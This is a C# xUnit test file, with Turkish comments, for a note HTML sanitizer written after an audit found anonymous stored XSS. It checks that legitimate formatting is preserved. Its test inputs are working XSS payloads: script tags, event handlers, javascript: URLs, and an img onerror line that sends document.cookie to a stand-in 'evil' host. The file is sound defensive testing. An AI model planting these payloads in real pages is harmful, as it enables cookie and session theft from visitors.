using CalibraHub.Application.Services.Security;
using Xunit;

namespace CalibraHub.Tests.Security;

/// <summary>
/// 2026-08-24 güvenlik denetimi Y1 (anonim stored XSS) regresyon testleri.
///
/// <c>Views/Notes/Public.cshtml</c> not içeriğini <c>@Html.Raw</c> ile basıyor ve sayfa
/// <c>[AllowAnonymous]</c>. İçerik kullanıcı yazımı Tiptap HTML'i olduğundan, temizlenmeden
/// basılması herkese açık link üzerinden anonim ziyaretçide script çalıştırıyordu.
///
/// Testler iki yönlü: (1) XSS taşıyıcıları TEMİZLENMELİ, (2) meşru biçimlendirme KORUNMALI
/// (aksi halde notlar bozulur).
/// </summary>
public class NoteHtmlSanitizerTests
{
    // ── (1) XSS taşıyıcıları temizlenmeli ───────────────────────────────────

    [Theory]
    [InlineData("<script>alert(1)</script>", "script")]
    [InlineData("<img src=x onerror=\"fetch('//evil/?'+document.cookie)\">", "onerror")]
    [InlineData("<a href=\"javascript:alert(1)\">tikla</a>", "javascript:")]
    [InlineData("<iframe src=\"//evil\"></iframe>", "iframe")]
    [InlineData("<div onclick=\"steal()\">x</div>", "onclick")]
    [InlineData("<svg/onload=alert(1)>", "onload")]
    [InlineData("<body onload=alert(1)>", "onload")]
    public void Zararli_icerik_temizlenir(string kotucul, string kalmamasiGereken)
    {
        var temiz = NoteHtmlSanitizer.Sanitize(kotucul);
        Assert.DoesNotContain(kalmamasiGereken, temiz, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Style_ifadeleri_dusurulur()
    {
        var temiz = NoteHtmlSanitizer.Sanitize("<p style=\"background:url(javascript:alert(1))\">x</p>");
        Assert.DoesNotContain("javascript", temiz, StringComparison.OrdinalIgnoreCase);
    }

    // ── (2) Meşru biçimlendirme korunmalı ───────────────────────────────────

    [Theory]
    [InlineData("<p>Merhaba <strong>dünya</strong></p>", "strong")]
    [InlineData("<ul><li>bir</li><li>iki</li></ul>", "<li>")]
    [InlineData("<h2>Başlık</h2>", "<h2>")]
    [InlineData("<table><tr><td>hücre</td></tr></table>", "<td>")]
    [InlineData("<blockquote>alıntı</blockquote>", "blockquote")]
    [InlineData("<pre><code>kod</code></pre>", "code")]
    public void Mesru_bicimlendirme_korunur(string html, string beklenen)
    {
        var temiz = NoteHtmlSanitizer.Sanitize(html);
        Assert.Contains(beklenen, temiz, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Guvenli_baglanti_korunur()
    {
        var temiz = NoteHtmlSanitizer.Sanitize("<a href=\"https://ornek.com\">site</a>");
        Assert.Contains("https://ornek.com", temiz);
    }

    [Fact]
    public void Turkce_metin_bozulmaz()
    {
        // Mojibake regresyonu — proje genelinde tekrarlayan bir hata sınıfı.
        var temiz = NoteHtmlSanitizer.Sanitize("<p>Ağırlıklı çözüm: şüpheli İŞ ölçüsü</p>");
        Assert.Contains("Ağırlıklı çözüm: şüpheli İŞ ölçüsü", temiz);
    }

    [Fact]
    public void Bos_girdi_bos_doner()
    {
        Assert.Equal(string.Empty, NoteHtmlSanitizer.Sanitize(null));
        Assert.Equal(string.Empty, NoteHtmlSanitizer.Sanitize("   "));
    }
}
